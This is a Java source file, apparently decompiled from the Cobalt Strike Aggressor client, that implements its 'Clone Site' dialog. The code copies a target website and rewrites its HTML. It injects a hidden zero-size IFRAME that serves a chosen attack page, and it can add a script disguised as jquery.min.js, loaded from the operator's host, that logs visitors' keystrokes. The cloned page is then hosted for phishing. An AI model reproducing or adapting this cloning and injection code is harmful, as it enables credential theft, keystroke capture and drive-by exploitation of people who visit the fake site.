package aggressor.dialogs;

import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.MultiFrame;
import common.Callback;
import common.CommonUtils;
import common.TeamQueue;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class CloneSiteDialog implements DialogListener, Callback {

    protected MultiFrame window;

    protected JFrame dialog = null;

    protected TeamQueue conn = null;

    protected DataManager datal = null;

    protected Map options;

    protected String desc;

    protected String proto;

    public CloneSiteDialog(MultiFrame paramMultiFrame, TeamQueue teamQueue, DataManager dataManager) {
        this.window = paramMultiFrame;
        this.conn = teamQueue;
        this.datal = dataManager;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        this.options = map;
        this.proto = DialogUtils.bool(map, "ssl") ? "https://" : "http://";
        String str = DialogUtils.string(map, "cloneme");
        this.conn.call("cloudstrike.clone_site", CommonUtils.args(str), this);
    }

    public String updateRequest(String string1, String string2, boolean bl) {
        if (!"".equals(string2)) {
            String str = "<IFRAME SRC=\"" + string2 + "\" WIDTH=\"0\" HEIGHT=\"0\"></IFRAME>";
            string1 = string1.replaceFirst("(?i:</body>)", "\n" + str + "\n$0");
            if (!CommonUtils.isin(str, string1))
                string1 = string1 + str;
            this.desc += ". Serves " + string2;
        }
        if (bl) {
            String str = "<script src=\"" + this.proto + this.options.get("host") + ":" + DialogUtils.string(this.options, "port") + "/jquery/jquery.min.js\"></script>";
            string1 = string1.replaceFirst("(?i:</body>)", "\n" + str + "\n$0");
            if (!CommonUtils.isin(str, string1))
                string1 = string1 + str;
            this.desc += ". Logs keys";
        }
        return string1;
    }

    public void result(String string, Object object) {
        String str1 = DialogUtils.string(this.options, "cloneme");
        String str2 = DialogUtils.string(this.options, "attack");
        String str3 = DialogUtils.string(this.options, "uri");
        String str4 = DialogUtils.string(this.options, "host");
        String str5 = DialogUtils.string(this.options, "port");
        boolean bool1 = DialogUtils.bool(this.options, "ssl");
        boolean bool2 = DialogUtils.bool(this.options, "capture");
        this.desc = "Clone of: " + str1;
        if ("cloudstrike.clone_site".equals(string)) {
            String str = (String) object;
            if (str.length() == 0) {
                DialogUtils.showError("Clone of " + str1 + " is empty.\nTry to connect with HTTPS instead.");
            } else if (str.startsWith("error: ")) {
                DialogUtils.showError("Could not clone: " + str1 + "\n" + str.substring(7));
            } else {
                str = updateRequest(str, str2, bool2);
                this.conn.call("cloudstrike.host_site", CommonUtils.args(str4, Integer.valueOf(Integer.parseInt(str5)), Boolean.valueOf(bool1), str3, str, bool2 + "", this.desc, str1), this);
            }
        } else {
            String str = object + "";
            if ("success".equals(str)) {
                DialogUtils.startedWebService("cloned site", this.proto + str4 + ":" + str5 + str3);
            } else {
                DialogUtils.showError("Unable to start web server:\n" + str);
            }
        }
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("Clone Site", 640, 480);
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.set("uri", "/");
        dialogManager.set("port", "80");
        dialogManager.set("host", DataUtils.getLocalIP(this.datal));
        dialogManager.text("cloneme", "Clone URL:", 10);
        dialogManager.text("uri", "Local URI:", 20);
        dialogManager.text("host", "Local Host:", 20);
        dialogManager.text("port", "Local Port:", 20);
        dialogManager.site("attack", "Attack:", this.conn, this.datal);
        dialogManager.checkbox_add("ssl", "SSL:", "Enable SSL", DataUtils.hasValidSSL(this.datal));
        dialogManager.checkbox_add("capture", "", "Log keystrokes on cloned site", true);
        JButton jButton1 = dialogManager.action("Clone");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-website-clone-tool");
        this.dialog.add(DialogUtils.description("The site cloner copies a website and fixes the code so images load. You may add exploits to cloned sites or capture data submitted by visitors"), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}
